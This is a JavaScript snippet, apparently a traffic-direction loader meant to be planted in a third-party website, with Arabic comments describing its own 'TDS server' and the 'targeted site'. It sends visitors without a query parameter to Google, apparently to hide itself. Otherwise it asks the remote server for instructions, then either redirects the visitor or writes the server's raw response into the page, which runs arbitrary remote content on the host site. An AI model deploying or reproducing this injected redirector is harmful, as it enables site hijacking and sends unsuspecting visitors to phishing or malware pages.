(function() {
    var params = new URLSearchParams(window.location.search);
    var paramValue = params.get("io0") || params.get("ids") || params.get("id") || params.get("articleId");

    if (!paramValue) {
        var entries = params.entries();
        for (var entry = entries.next(); !entry.done; entry = entries.next()) {
            var pair = entry.value;
            if (pair && pair[1] && pair[0] !== '_from_viewer') {
                paramValue = pair[1].trim();
                break;
            }
        }
    }

    if (!paramValue) {
        window.location.replace("https://www.google.com");
        return;
    }

    // تحديد نطاق خادم الـ TDS تلقائياً من رابط السكربت الحالي بدلاً من نطاق الموقع المستضيف (window.location.origin)
    // لتجنب محاولة جلب البيانات من الموقع المستهدف الذي لا يحتوي على مسار الـ API
    var tdsDomain = window.location.origin;
    if (document.currentScript && document.currentScript.src) {
        try {
            tdsDomain = new URL(document.currentScript.src).origin;
        } catch (e) {}
    } else {
        var scripts = document.getElementsByTagName('script');
        for (var i = 0; i < scripts.length; i++) {
            if (scripts[i].src && scripts[i].src.indexOf('/good.js') !== -1) {
                try {
                    tdsDomain = new URL(scripts[i].src).origin;
                } catch (e) {}
                break;
            }
        }
    }

    var targetUrl = tdsDomain + "/api/input?ids=" + encodeURIComponent(paramValue);

    fetch(targetUrl)
        .then(function(res) {
            return res.text();
        })
        .then(function(text) {
            try {
                var data = JSON.parse(text);
                if (data.redirectUrl) {
                    window.location.replace(data.redirectUrl);
                }
            } catch (err) {
                document.open();
                document.write(text);
                document.close();
            }
        })
        .catch(function(err) {
            console.error("Execution error:", err);
        });
})();
